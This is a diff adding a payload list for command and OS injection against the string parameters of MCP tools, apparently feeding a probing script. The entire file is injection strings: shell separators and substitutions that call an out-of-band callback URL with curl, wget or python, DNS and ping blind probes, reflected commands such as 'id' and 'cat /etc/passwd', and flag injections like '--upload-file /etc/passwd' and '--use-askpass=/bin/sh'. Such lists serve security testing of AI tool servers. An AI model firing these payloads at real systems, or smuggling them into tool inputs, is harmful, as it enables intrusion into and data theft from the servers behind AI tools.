@@ -1,0 +1,50 @@
+# MCP05 — Command / OS injection payloads for tool string parameters.
+# Used by artemis/scripts/mcp-probe.sh (mode: cmdinj) and mcp-confirm.py.
+#
+# Placeholders substituted by the probe at fire time:
+#   {{OOB}}      full out-of-band callback URL  (e.g. http://<listener-ip>:18080/h/<nonce>)
+#   {{OOBHOST}}  bare host:port of the listener  (for DNS/ping-style blind confirmation)
+#   {{NONCE}}    the per-fire correlation nonce
+#
+# Prefer the OOB variants: a blind callback PROVES execution; a reflected `id`
+# string can be echoed without executing. One payload per line.
+
+# ── Out-of-band execution proof (blind — the confirming variants) ──
+; curl -s {{OOB}}
+| curl -s {{OOB}}
+& curl -s {{OOB}} &
+$(curl -s {{OOB}})
+`curl -s {{OOB}}`
+; wget -qO- {{OOB}}
+| wget -qO- {{OOB}}
+%0acurl -s {{OOB}}
+%0a curl -s {{OOB}}
+"; curl -s {{OOB}} ;"
+'; curl -s {{OOB}} ;'
+) ; curl -s {{OOB}} ; (
+|| curl -s {{OOB}}
+&& curl -s {{OOB}}
+; python3 -c "import urllib.request;urllib.request.urlopen('{{OOB}}')"
+
+# ── DNS / ICMP blind (when egress HTTP is filtered but DNS/ping is not) ──
+$(nslookup {{OOBHOST}})
+`nslookup {{OOBHOST}}`
+; nslookup {{OOBHOST}}
+; ping -c1 {{OOBHOST}}
+$(dig {{OOBHOST}})
+
+# ── Reflected / echo (non-blind — only when output is returned to you) ──
+; id
+| id
+$(id)
+`id`
+& whoami
+; uname -a
+$(cat /etc/hostname)
+%0aid
+| cat /etc/passwd
+
+# ── Argument / flag injection into wrapped CLIs (git, tar, ffmpeg, etc.) ──
+--upload-file /etc/passwd
+-o /tmp/x; curl -s {{OOB}}
+--use-askpass=/bin/sh
